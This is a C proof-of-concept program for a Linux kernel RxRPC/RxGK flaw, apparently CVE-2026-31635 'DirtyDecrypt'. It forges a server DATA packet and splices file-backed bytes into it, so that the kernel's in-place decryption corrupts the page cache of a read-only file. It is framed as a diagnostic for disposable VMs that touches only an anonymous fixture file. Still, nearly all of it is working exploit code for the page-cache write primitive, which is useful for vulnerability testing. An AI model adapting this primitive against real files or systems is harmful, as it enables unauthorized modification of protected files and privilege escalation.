#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

/*
 * SG-2026-0022 / CVE-2026-31635 DirtyDecrypt diagnostic PoC
 *
 * Independent diagnostic implementation based on Linux v7.0.5 UAPI and
 * kernel source.  It does not include or link the public V12 exploit:
 *   include/uapi/linux/rxrpc.h
 *   net/rxrpc/{key.c,protocol.h,rxgk.c,call_event.c,recvmsg.c}
 *   crypto/krb5enc.c
 *
 * This is deliberately a one-shot page-cache corruption detector, not an LPE
 * payload.  Run it only as an unprivileged user inside a disposable VM.  It
 * splices exactly one 16-byte file range into an RxGK DATA packet and reports
 * whether in-place decryption changed that range in the page cache.
 */

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/vfs.h>
#include <time.h>
#include <unistd.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SO_NO_CHECK
#define SO_NO_CHECK 11
#endif
#ifndef RXRPC_SECURITY_KEY
#define RXRPC_SECURITY_KEY 1
#endif
#ifndef RXRPC_MIN_SECURITY_LEVEL
#define RXRPC_MIN_SECURITY_LEVEL 4
#endif
#ifndef RXRPC_USER_CALL_ID
#define RXRPC_USER_CALL_ID 1
#endif
#ifndef RXRPC_SECURITY_YFS_RXGK
#define RXRPC_SECURITY_YFS_RXGK 6
#endif
#ifndef RXRPC_SECURITY_ENCRYPT
#define RXRPC_SECURITY_ENCRYPT 2
#endif
#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING -2
#endif
#ifndef EXT4_SUPER_MAGIC
#define EXT4_SUPER_MAGIC 0xef53
#endif
#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif
#ifndef AT_EACCESS
#define AT_EACCESS 0x200
#endif
#ifndef STATX_ATTR_DAX
#define STATX_ATTR_DAX 0x00200000
#endif

#define SG22_RXRPC_PACKET_DATA       1
#define SG22_RXRPC_PACKET_CHALLENGE  6
#define SG22_RXRPC_PACKET_RESPONSE   7
#define SG22_RXRPC_CLIENT_INITIATED  0x01
#define SG22_RXRPC_LAST_PACKET       0x04

#define SG22_SERVICE_ID              0x2014
#define SG22_KRB5_ENCTYPE_AES128_SHA1 17
#define SG22_NONCE_LEN               20
#define SG22_AES_BLOCK               16
#define SG22_KRB5_TAG_LEN            12
#define SG22_CIPHER_BLOCKS           4
#define SG22_SECURE_BLOB_LEN \
	(SG22_CIPHER_BLOCKS * SG22_AES_BLOCK + SG22_KRB5_TAG_LEN)
#define SG22_TARGET_LEN              SG22_AES_BLOCK
#define SG22_FIXTURE_OFFSET          512
#define SG22_STATX_BASIC_STATS       0x000007ffU

/* Fixed Linux statx ABI layout, named locally to avoid libc header variance. */
struct sg22_statx_timestamp {
	int64_t tv_sec;
	uint32_t tv_nsec;
	int32_t reserved;
};

struct sg22_statx {
	uint32_t mask;
	uint32_t blksize;
	uint64_t attributes;
	uint32_t nlink;
	uint32_t uid;
	uint32_t gid;
	uint16_t mode;
	uint16_t spare0;
	uint64_t ino;
	uint64_t size;
	uint64_t blocks;
	uint64_t attributes_mask;
	struct sg22_statx_timestamp atime;
	struct sg22_statx_timestamp btime;
	struct sg22_statx_timestamp ctime;
	struct sg22_statx_timestamp mtime;
	uint32_t rdev_major;
	uint32_t rdev_minor;
	uint32_t dev_major;
	uint32_t dev_minor;
	uint64_t mnt_id;
	uint32_t dio_mem_align;
	uint32_t dio_offset_align;
	uint64_t spare3[12];
};

_Static_assert(sizeof(struct sg22_statx) == 256,
	       "Linux statx ABI object must be 256 bytes");

/* Minimal AF_RXRPC UAPI copied from include/uapi/linux/rxrpc.h. */
struct sockaddr_rxrpc {
	sa_family_t srx_family;
	uint16_t srx_service;
	uint16_t transport_type;
	uint16_t transport_len;
	union {
		sa_family_t family;
		struct sockaddr_in sin;
		struct sockaddr_in6 sin6;
	} transport;
};

struct sg22_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t call_number;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t user_status;
	uint8_t security_index;
	uint16_t cksum;
	uint16_t service_id;
} __attribute__((packed));

_Static_assert(sizeof(struct sg22_wire_header) == 28,
	       "RxRPC wire header must be 28 bytes");

struct sg22_xdr {
	uint8_t data[128];
	size_t len;
};

static void die_errno(const char *what)
{
	fprintf(stderr, "[-] %s: %s\n", what, strerror(errno));
	exit(1);
}

static void die_msg(const char *what)
{
	fprintf(stderr, "[-] %s\n", what);
	exit(1);
}

static void put_be32(struct sg22_xdr *x, uint32_t value)
{
	uint32_t be = htonl(value);

	if (x->len + sizeof(be) > sizeof(x->data))
		die_msg("internal XDR buffer overflow");
	memcpy(x->data + x->len, &be, sizeof(be));
	x->len += sizeof(be);
}

static void put_be64(struct sg22_xdr *x, uint64_t value)
{
	put_be32(x, (uint32_t)(value >> 32));
	put_be32(x, (uint32_t)value);
}

static void put_bytes(struct sg22_xdr *x, const void *data, size_t len)
{
	if (x->len + len > sizeof(x->data))
		die_msg("internal XDR buffer overflow");
	memcpy(x->data + x->len, data, len);
	x->len += len;
}

/*
 * Build the 96-byte XDR key accepted by rxrpc_preparse_xdr() and
 * rxrpc_preparse_xdr_yfs_rxgk().  The token is deliberately short-lived only
 * with the process: no expiry, AES128-CTS-HMAC-SHA1-96, encryption level, an
 * arbitrary 16-byte base key and an empty ticket.
 */
static size_t build_rxgk_key(uint8_t out[96])
{
	static const uint8_t cell[4] = { 's', 'g', '2', '0' };
	static const uint8_t base_key[16] = {
		0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
		0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	};
	struct sg22_xdr x = { 0 };

	put_be32(&x, 0);                         /* flags */
	put_be32(&x, sizeof(cell));              /* cell name length */
	put_bytes(&x, cell, sizeof(cell));
	put_be32(&x, 1);                         /* token count */
	put_be32(&x, 76);                        /* wrapper: sec_ix + body */
	put_be32(&x, RXRPC_SECURITY_YFS_RXGK);
	put_be64(&x, 0);                         /* begin time */
	put_be64(&x, 0);                         /* end time */
	put_be64(&x, RXRPC_SECURITY_ENCRYPT);    /* level */
	put_be64(&x, 0);                         /* lifetime */
	put_be64(&x, 0);                         /* byte lifetime */
	put_be64(&x, SG22_KRB5_ENCTYPE_AES128_SHA1);
	put_be32(&x, sizeof(base_key));
	put_bytes(&x, base_key, sizeof(base_key));
	put_be32(&x, 0);                         /* empty ticket */

	if (x.len != 96)
		die_msg("internal RxGK XDR length mismatch");
	memcpy(out, x.data, x.len);
	return x.len;
}

static long install_rxgk_key(const char *description)
{
	uint8_t payload[96];
	size_t payload_len = build_rxgk_key(payload);
	long serial;

	errno = 0;
	serial = syscall(SYS_add_key, "rxrpc", description,
			 payload, payload_len, KEY_SPEC_PROCESS_KEYRING);
	memset(payload, 0, sizeof(payload));
	return serial;
}

static void print_hex(const uint8_t *p, size_t len)
{
	for (size_t i = 0; i < len; i++)
		printf("%02x", p[i]);
}

/*
 * Create the only object this diagnostic is allowed to touch.  O_TMPFILE
 * makes it anonymous from birth; the write-capable setup descriptor is then
 * reopened read-only through its pinned /proc/self/fd handle and closed before
 * the trigger.  No attacker-selected pathname is ever used as page-cache
 * backing.
 */
static int create_fixture(const char *scratch_directory, long page_size,
			  off_t *target_offset)
{
	struct stat writer_st, reader_st;
	struct statfs scratch_fs, fixture_fs;
	struct sg22_statx stx;
	uint8_t *page;
	char proc_fd_path[64];
	ssize_t done;
	int dirfd, writer_fd, reader_fd;

	if (page_size <= SG22_FIXTURE_OFFSET + SG22_TARGET_LEN)
		die_msg("system page size is too small for the diagnostic fixture");

	dirfd = open(scratch_directory,
		     O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
	if (dirfd < 0)
		die_errno("open(ext4 scratch directory)");
	if (fstatfs(dirfd, &scratch_fs) < 0)
		die_errno("fstatfs(ext4 scratch directory)");
	if ((unsigned long)scratch_fs.f_type != EXT4_SUPER_MAGIC)
		die_msg("scratch directory must reside on ext4");

	writer_fd = openat(dirfd, ".",
			   O_TMPFILE | O_RDWR | O_CLOEXEC, 0600);
	if (writer_fd < 0)
		die_errno("openat(O_TMPFILE fixture)");
	page = malloc((size_t)page_size);
	if (!page)
		die_errno("malloc(fixture page)");
	for (long i = 0; i < page_size; i++)
		page[i] = (uint8_t)(((unsigned long)i * 37UL + 0x5aUL) & 0xffUL);

	done = 0;
	while (done < page_size) {
		ssize_t ret = pwrite(writer_fd, page + done,
				     (size_t)(page_size - done), done);

		if (ret < 0) {
			if (errno == EINTR)
				continue;
			die_errno("pwrite(fixture)");
		}
		if (ret == 0)
			die_msg("short pwrite(fixture)");
		done += ret;
	}
	memset(page, 0, (size_t)page_size);
	free(page);
	if (fsync(writer_fd) < 0)
		die_errno("fsync(fixture)");
	if (fchmod(writer_fd, 0444) < 0)
		die_errno("fchmod(fixture, 0444)");
	if (fstat(writer_fd, &writer_st) < 0)
		die_errno("fstat(fixture writer)");

	if (snprintf(proc_fd_path, sizeof(proc_fd_path), "/proc/self/fd/%d",
		     writer_fd) >= (int)sizeof(proc_fd_path))
		die_msg("internal /proc/self/fd path overflow");
	reader_fd = open(proc_fd_path, O_RDONLY | O_CLOEXEC);
	if (reader_fd < 0)
		die_errno("reopen anonymous fixture read-only through pinned fd");
	if (fstat(reader_fd, &reader_st) < 0)
		die_errno("fstat(fixture reader)");
	if (writer_st.st_dev != reader_st.st_dev ||
	    writer_st.st_ino != reader_st.st_ino)
		die_msg("read-only fixture descriptor changed inode identity");
	close(writer_fd);
	close(dirfd);

	if (!S_ISREG(reader_st.st_mode) || reader_st.st_uid != geteuid() ||
	    reader_st.st_nlink != 0 ||
	    reader_st.st_size != page_size ||
	    (reader_st.st_mode & 07777) != 0444)
		die_msg("anonymous fixture failed type, owner, link, size, or mode checks");
	if (fstatfs(reader_fd, &fixture_fs) < 0)
		die_errno("fstatfs(fixture)");
	if ((unsigned long)fixture_fs.f_type != EXT4_SUPER_MAGIC)
		die_msg("fixture moved off ext4 unexpectedly");

	memset(&stx, 0, sizeof(stx));
	if (syscall(SYS_statx, reader_fd, "",
		    AT_EMPTY_PATH | AT_STATX_SYNC_AS_STAT,
		    SG22_STATX_BASIC_STATS, &stx) < 0)
		die_errno("statx(fixture, AT_EMPTY_PATH)");
	if (!(stx.attributes_mask & STATX_ATTR_DAX))
		die_msg("filesystem cannot attest that the fixture is non-DAX");
	if (stx.attributes & STATX_ATTR_DAX)
		die_msg("DAX fixture is unsupported; page cache is required");

	errno = 0;
	if (syscall(SYS_faccessat2, reader_fd, "", W_OK,
		    AT_EMPTY_PATH | AT_EACCESS) == 0)
		die_msg("fixture remains writable by the effective user");
	if (errno != EACCES && errno != EPERM && errno != EROFS)
		die_errno("faccessat2(fixture, W_OK) failed unexpectedly");
	printf("[+] pinned write-access check denied: %s\n", strerror(errno));
	printf("[+] created anonymous one-page ext4 fixture (mode 0444, non-DAX)\n");

	*target_offset = SG22_FIXTURE_OFFSET;
	return reader_fd;
}

static void set_receive_timeout(int fd, int seconds)
{
	struct timeval tv = { .tv_sec = seconds, .tv_usec = 0 };

	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
		die_errno("setsockopt(SO_RCVTIMEO)");
}

static int make_udp_peer(struct sockaddr_in *bound)
{
	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	int no_check = 1;
	socklen_t len = sizeof(*bound);

	if (fd < 0)
		die_errno("socket(AF_INET, SOCK_DGRAM)");
	if (setsockopt(fd, SOL_SOCKET, SO_NO_CHECK,
		       &no_check, sizeof(no_check)) < 0)
		die_errno("setsockopt(SO_NO_CHECK)");
	memset(bound, 0, sizeof(*bound));
	bound->sin_family = AF_INET;
	bound->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bound->sin_port = 0;
	if (bind(fd, (struct sockaddr *)bound, sizeof(*bound)) < 0)
		die_errno("bind(fake RxRPC peer)");
	if (getsockname(fd, (struct sockaddr *)bound, &len) < 0)
		die_errno("getsockname(fake RxRPC peer)");
	set_receive_timeout(fd, 3);
	return fd;
}

static int make_rxrpc_client(const char *key_description)
{
	unsigned int level = RXRPC_SECURITY_ENCRYPT;
	int fd = socket(AF_RXRPC, SOCK_DGRAM | SOCK_CLOEXEC, AF_INET);

	if (fd < 0)
		die_errno("socket(AF_RXRPC)");
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
		       key_description, strlen(key_description)) < 0)
		die_errno("setsockopt(RXRPC_SECURITY_KEY)");
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
		       &level, sizeof(level)) < 0)
		die_errno("setsockopt(RXRPC_MIN_SECURITY_LEVEL)");
	set_receive_timeout(fd, 3);
	return fd;
}

static void start_client_call(int rxfd, const struct sockaddr_in *peer)
{
	struct sockaddr_rxrpc destination;
	union {
		struct cmsghdr align;
		uint8_t bytes[CMSG_SPACE(sizeof(unsigned long))];
	} control;
	struct cmsghdr *cmsg;
	unsigned long user_call_id = 0x53473230UL;
	uint8_t request_byte = 0x53;
	struct iovec iov = {
		.iov_base = &request_byte,
		.iov_len = sizeof(request_byte),
	};
	struct msghdr msg = { 0 };
	ssize_t ret;

	memset(&destination, 0, sizeof(destination));
	destination.srx_family = AF_RXRPC;
	destination.srx_service = SG22_SERVICE_ID;
	destination.transport_type = SOCK_DGRAM;
	destination.transport_len = sizeof(destination.transport.sin);
	destination.transport.sin = *peer;

	memset(&control, 0, sizeof(control));
	msg.msg_name = &destination;
	msg.msg_namelen = sizeof(destination);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control.bytes;
	msg.msg_controllen = sizeof(control);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(user_call_id));
	memcpy(CMSG_DATA(cmsg), &user_call_id, sizeof(user_call_id));

	ret = sendmsg(rxfd, &msg, 0);
	if (ret != (ssize_t)sizeof(request_byte)) {
		if (ret < 0)
			die_errno("sendmsg(AF_RXRPC initial call)");
		die_msg("short AF_RXRPC initial send");
	}
}

static ssize_t receive_packet_type(int udpfd, uint8_t wanted_type,
				   uint8_t *packet, size_t capacity,
				   struct sockaddr_in *source)
{
	for (unsigned int attempt = 0; attempt < 16; attempt++) {
		struct sockaddr_in from;
		socklen_t from_len = sizeof(from);
		ssize_t len = recvfrom(udpfd, packet, capacity, 0,
				       (struct sockaddr *)&from, &from_len);

		if (len < 0)
			return -1;
		if ((size_t)len < sizeof(struct sg22_wire_header))
			continue;
		if (((struct sg22_wire_header *)packet)->type != wanted_type)
			continue;
		if (source)
			*source = from;
		return len;
	}
	errno = EPROTO;
	return -1;
}

static void send_challenge(int udpfd, const struct sockaddr_in *client,
			   const struct sg22_wire_header *initial)
{
	struct {
		struct sg22_wire_header header;
		uint8_t nonce[SG22_NONCE_LEN];
	} __attribute__((packed)) challenge;
	ssize_t ret;

	memset(&challenge, 0, sizeof(challenge));
	challenge.header.epoch = initial->epoch;
	challenge.header.cid = htonl(ntohl(initial->cid) & ~3U);
	challenge.header.call_number = 0;
	challenge.header.seq = 0;
	challenge.header.serial = htonl(1);
	challenge.header.type = SG22_RXRPC_PACKET_CHALLENGE;
	challenge.header.flags = 0; /* server -> client */
	challenge.header.security_index = RXRPC_SECURITY_YFS_RXGK;
	challenge.header.service_id = initial->service_id;
	for (size_t i = 0; i < sizeof(challenge.nonce); i++)
		challenge.nonce[i] = (uint8_t)(0x40 + i);

	ret = sendto(udpfd, &challenge, sizeof(challenge), 0,
		     (const struct sockaddr *)client, sizeof(*client));
	if (ret != (ssize_t)sizeof(challenge)) {
		if (ret < 0)
			die_errno("sendto(RxGK CHALLENGE)");
		die_msg("short RxGK CHALLENGE send");
	}
}

/*
 * Emit one UDP datagram while keeping only ciphertext block C1 backed by the
 * target file page:
 *
 *   copied: wire header || C0
 *   splice: C1 = target file bytes [offset, offset + 16)
 *   copied: C2 || C3 || 12-byte tag
 *
 * AES-CBC-CTS applies its special handling to the last two blocks, so C1 is a
 * normal CBC block.  On the vulnerable kernel, decrypt writes P1 back into the
 * exact 16-byte page-cache fragment.  The tag is intentionally invalid: the
 * write occurs before authentication failure in enctype 17's krb5enc path.
 */
static void send_spliced_data(int udpfd, int target_fd, off_t target_offset,
			      const struct sg22_wire_header *initial,
			      uint16_t key_number_be)
{
	struct {
		struct sg22_wire_header header;
		uint8_t c0[SG22_AES_BLOCK];
	} __attribute__((packed)) prefix;
	uint8_t suffix[2 * SG22_AES_BLOCK + SG22_KRB5_TAG_LEN];
	int pipefd[2];
	int one = 1, zero = 0;
	ssize_t ret;
	loff_t splice_offset = target_offset;

	memset(&prefix, 0, sizeof(prefix));
	prefix.header.epoch = initial->epoch;
	prefix.header.cid = initial->cid;
	prefix.header.call_number = initial->call_number;
	prefix.header.seq = htonl(1);
	prefix.header.serial = htonl(2);
	prefix.header.type = SG22_RXRPC_PACKET_DATA;
	prefix.header.flags = SG22_RXRPC_LAST_PACKET;
	prefix.header.security_index = RXRPC_SECURITY_YFS_RXGK;
	prefix.header.cksum = key_number_be;
	prefix.header.service_id = initial->service_id;
	for (size_t i = 0; i < sizeof(prefix.c0); i++)
		prefix.c0[i] = (uint8_t)(0xa0 + i);
	for (size_t i = 0; i < sizeof(suffix); i++)
		suffix[i] = (uint8_t)(0x20 + i);

	if (pipe2(pipefd, O_CLOEXEC) < 0)
		die_errno("pipe2");
	if (setsockopt(udpfd, IPPROTO_UDP, UDP_CORK, &one, sizeof(one)) < 0)
		die_errno("setsockopt(UDP_CORK=1)");

	ret = send(udpfd, &prefix, sizeof(prefix), 0);
	if (ret != (ssize_t)sizeof(prefix)) {
		if (ret < 0)
			die_errno("send(DATA prefix)");
		die_msg("short DATA prefix send");
	}

	ret = splice(target_fd, &splice_offset, pipefd[1], NULL,
		     SG22_TARGET_LEN, 0);
	if (ret != SG22_TARGET_LEN) {
		if (ret < 0)
			die_errno("splice(target -> pipe)");
		die_msg("short target-to-pipe splice");
	}
	ret = splice(pipefd[0], NULL, udpfd, NULL, SG22_TARGET_LEN, 0);
	if (ret != SG22_TARGET_LEN) {
		if (ret < 0)
			die_errno("splice(pipe -> UDP)");
		die_msg("short pipe-to-UDP splice");
	}

	ret = send(udpfd, suffix, sizeof(suffix), 0);
	if (ret != (ssize_t)sizeof(suffix)) {
		if (ret < 0)
			die_errno("send(DATA suffix)");
		die_msg("short DATA suffix send");
	}
	if (setsockopt(udpfd, IPPROTO_UDP, UDP_CORK, &zero, sizeof(zero)) < 0)
		die_errno("setsockopt(UDP_CORK=0)");
	close(pipefd[0]);
	close(pipefd[1]);
}

static int drive_rxrpc_recvmsg(int rxfd)
{
	uint8_t byte = 0;
	union {
		struct cmsghdr align;
		uint8_t bytes[256];
	} control;
	struct iovec iov = { .iov_base = &byte, .iov_len = sizeof(byte) };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control.bytes,
		.msg_controllen = sizeof(control),
	};
	struct pollfd pfd = { .fd = rxfd, .events = POLLIN | POLLERR };
	int ready;
	ssize_t ret;

	ready = poll(&pfd, 1, 3000);
	if (ready < 0)
		return -errno;
	if (ready == 0) {
		return -ETIMEDOUT;
	}
	errno = 0;
	ret = recvmsg(rxfd, &msg, 0);
	if (ret < 0)
		return -errno;
	return (int)ret;
}

static void usage(const char *program)
{
	fprintf(stderr,
		"Usage: %s <writable-ext4-scratch-directory>\n"
		"Example (disposable QEMU guest only):\n"
		"  %s /mnt/sg22-scratch\n",
		program, program);
}

int main(int argc, char **argv)
{
	const char *scratch_directory;
	long page_size;
	off_t map_base, target_offset;
	size_t map_delta, map_len;
	uint8_t before[SG22_TARGET_LEN], after[SG22_TARGET_LEN];
	uint8_t *mapping;
	int target_fd;
	char key_description[64];
	long key_serial;
	struct sockaddr_in fake_bound, client_addr;
	uint8_t packet[4096];
	ssize_t packet_len;
	struct sg22_wire_header initial, response;
	struct sockaddr_in response_source;
	int udpfd, rxfd, recv_result;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== SG-2026-0022 DirtyDecrypt PoC ===\n");
	printf("uid=%ld euid=%ld gid=%ld egid=%ld\n",
	       (long)getuid(), (long)geteuid(), (long)getgid(), (long)getegid());

	if (argc != 2) {
		usage(argv[0]);
		return 64;
	}
	if (geteuid() == 0)
		die_msg("run as an unprivileged user (UID 1000 in the QEMU lab)");
	scratch_directory = argv[1];
	page_size = sysconf(_SC_PAGESIZE);
	if (page_size <= 0)
		die_msg("cannot determine page size");
	target_fd = create_fixture(scratch_directory, page_size, &target_offset);
	map_delta = (size_t)(target_offset % (off_t)page_size);
	if (map_delta + SG22_TARGET_LEN > (size_t)page_size)
		die_msg("the selected 16-byte range must not cross a page boundary");
	map_base = target_offset - (off_t)map_delta;
	map_len = map_delta + SG22_TARGET_LEN;
	mapping = mmap(NULL, map_len, PROT_READ, MAP_SHARED, target_fd, map_base);
	if (mapping == MAP_FAILED)
		die_errno("mmap(target)");
	memcpy(before, mapping + map_delta, sizeof(before));
	printf("[*] fixture=(anonymous) offset=%u before=",
	       (unsigned int)SG22_FIXTURE_OFFSET);
	print_hex(before, sizeof(before));
	putchar('\n');

	snprintf(key_description, sizeof(key_description), "sg22-%ld",
		 (long)getpid());
	key_serial = install_rxgk_key(key_description);
	if (key_serial < 0)
		die_errno("add_key(rxrpc XDR token)");
	printf("[+] installed process-local YFS-RxGK key (serial=%ld)\n",
	       key_serial);

	udpfd = make_udp_peer(&fake_bound);
	rxfd = make_rxrpc_client(key_description);
	start_client_call(rxfd, &fake_bound);

	packet_len = receive_packet_type(udpfd, SG22_RXRPC_PACKET_DATA,
				 packet, sizeof(packet), &client_addr);
	if (packet_len < 0)
		die_errno("receive initial RxRPC DATA");
	memcpy(&initial, packet, sizeof(initial));
	if (!(initial.flags & SG22_RXRPC_CLIENT_INITIATED) ||
	    initial.security_index != RXRPC_SECURITY_YFS_RXGK ||
	    initial.call_number == 0 || initial.service_id == 0)
		die_msg("initial packet did not describe the expected RxGK client call");
	printf("[+] captured client call: epoch=%08x cid=%08x call=%u service=%u\n",
	       ntohl(initial.epoch), ntohl(initial.cid),
	       ntohl(initial.call_number), ntohs(initial.service_id));

	send_challenge(udpfd, &client_addr, &initial);
	packet_len = receive_packet_type(udpfd, SG22_RXRPC_PACKET_RESPONSE,
				 packet, sizeof(packet), &response_source);
	if (packet_len < 0)
		die_errno("receive automatic RxGK RESPONSE");
	memcpy(&response, packet, sizeof(response));
	if (response_source.sin_addr.s_addr != client_addr.sin_addr.s_addr ||
	    response_source.sin_port != client_addr.sin_port ||
	    response.epoch != initial.epoch ||
	    ntohl(response.cid) != (ntohl(initial.cid) & ~3U) ||
	    response.call_number != 0 || response.seq != 0 ||
	    !(response.flags & SG22_RXRPC_CLIENT_INITIATED) ||
	    response.security_index != RXRPC_SECURITY_YFS_RXGK ||
	    response.service_id != initial.service_id)
		die_msg("unexpected RxGK RESPONSE header");
	printf("[+] kernel emitted RxGK RESPONSE (key_number=%u)\n",
	       ntohs(response.cksum));

	if (connect(udpfd, (struct sockaddr *)&client_addr,
		    sizeof(client_addr)) < 0)
		die_errno("connect(fake peer -> RxRPC UDP endpoint)");
	send_spliced_data(udpfd, target_fd, target_offset,
			  &initial, response.cksum);
	printf("[*] sent one forged server DATA with a 16-byte file-backed C1 block\n");

	recv_result = drive_rxrpc_recvmsg(rxfd);
	__sync_synchronize();
	memcpy(after, mapping + map_delta, sizeof(after));
	if (recv_result == -EBADMSG)
		printf("[*] recvmsg returned expected authentication error: %s\n",
		       strerror(EBADMSG));
	else if (recv_result < 0)
		printf("[!] recvmsg returned %s, expected EBADMSG\n",
		       strerror(-recv_result));
	else
		printf("[!] recvmsg returned %d byte(s), expected EBADMSG\n",
		       recv_result);
	printf("[*] after =");
	print_hex(after, sizeof(after));
	putchar('\n');

	close(rxfd);
	close(udpfd);
	munmap(mapping, map_len);
	close(target_fd);

	if (memcmp(before, after, sizeof(before)) != 0) {
		printf("[VULNERABLE] anonymous read-only fixture changed in page cache\n");
		if (recv_result != -EBADMSG)
			printf("[!] mutation is decisive, but protocol termination was unexpected\n");
		printf("[!] discard or reboot the disposable guest before further use\n");
		return 0;
	}
	if (recv_result != -EBADMSG) {
		printf("[INCONCLUSIVE] no mutation and no controlled authentication failure\n");
		return 2;
	}

	printf("[NO MUTATION OBSERVED] inconclusive outside the controlled A/B lab\n");
	return 3;
}
